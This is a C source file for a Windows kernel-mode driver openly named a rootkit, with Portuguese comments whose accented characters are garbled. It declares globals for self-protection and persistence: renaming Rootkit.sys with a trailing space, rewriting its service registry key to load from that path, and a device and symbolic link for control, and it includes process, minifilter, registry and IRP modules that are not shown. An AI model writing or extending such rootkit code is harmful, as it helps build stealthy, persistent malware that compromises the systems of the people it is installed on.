

#include <fltKernel.h>
#include <ntstrsafe.h>

BOOLEAN ProtegerRegistro = TRUE;

// Local padr�o do driver
UNICODE_STRING LOCAL_DRIVER = RTL_CONSTANT_STRING(L"\\??\\C:\\Windows\\System32\\Drivers\\Rootkit.sys");

// Novo nome, que far� a prote��o
UNICODE_STRING LOCAL_NOVO = RTL_CONSTANT_STRING(L"\\??\\C:\\Windows\\System32\\Drivers\\Rootkit.sys ");

// Local no registro, que vamos modificar. Cont�m o local para carregar, no caso, teremos que renomear para o LOCAL_NOVO
UNICODE_STRING LOCAL_REGISTRO = RTL_CONSTANT_STRING(L"\\Registry\\Machine\\System\\CurrentControlSet\\Services\\RootKit");

// Novo valor para o registro
UNICODE_STRING NOVO_VALOR = RTL_CONSTANT_STRING(L"system32\\DRIVERS\\Rootkit.sys \n");

// Al�a para o arquivo
HANDLE Alca = NULL;


// Nome do dispositivo
UNICODE_STRING DispositivoNome = RTL_CONSTANT_STRING(L"\\Device\\RootKitSys"), SysNome = RTL_CONSTANT_STRING(L"\\??\\RootKitSys");

// Dispositivo global, usado para criar os links simbolicos para a comunica��o
PDEVICE_OBJECT DispositivoGlobal;




#include "processo.c"
#include "minifiltro.c"
#include "registro.c"
#include "irps.c"
